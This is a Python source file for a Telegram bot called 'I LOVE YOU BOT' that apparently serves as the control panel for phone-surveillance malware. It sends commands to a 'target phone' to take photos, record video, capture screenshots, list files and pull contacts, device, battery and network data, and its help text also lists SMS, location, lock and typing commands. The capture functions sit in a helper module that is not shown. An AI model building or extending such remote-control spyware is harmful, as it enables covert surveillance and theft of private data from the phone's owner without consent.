# telegram_control.py
import os
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from config import BOT_TOKEN, CHAT_ID, PERMISSION_LINK, PERMISSION_GRANTED
from modules.helper import *

app = Application.builder().token(BOT_TOKEN).build()
bot = Bot(token=BOT_TOKEN)

def check_permission():
    if not PERMISSION_GRANTED:
        print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("❌ Unauthorized user.")
        return
    await update.message.reply_text("💖 I LOVE YOU BOT is active! Use /help for commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    commands = """
📸 /photo
🎥 /video
🖼️ /screenshot
📂 /files
📞 /contacts
💬 /sms
📡 /location
🔊 /volume
🔒 /lock
⌨️ /type
📱 /info
🔋 /battery
🌐 /network
"""
    await update.message.reply_text(commands)

async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(take_photo())

async def video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(record_video())

async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(screenshot())

async def files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(list_files())

async def contacts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(get_contacts())

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(device_info())

async def battery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(battery_status())

async def network(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(network_status())

# Register handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("photo", photo))
app.add_handler(CommandHandler("video", video))
app.add_handler(CommandHandler("screenshot", screenshot_cmd))
app.add_handler(CommandHandler("files", files))
app.add_handler(CommandHandler("contacts", contacts))
app.add_handler(CommandHandler("info", info))
app.add_handler(CommandHandler("battery", battery))
app.add_handler(CommandHandler("network", network))
# অন্য commands add করতে পারো helper থেকে

print("💖 I LOVE YOU BOT is running...")
app.run_polling()
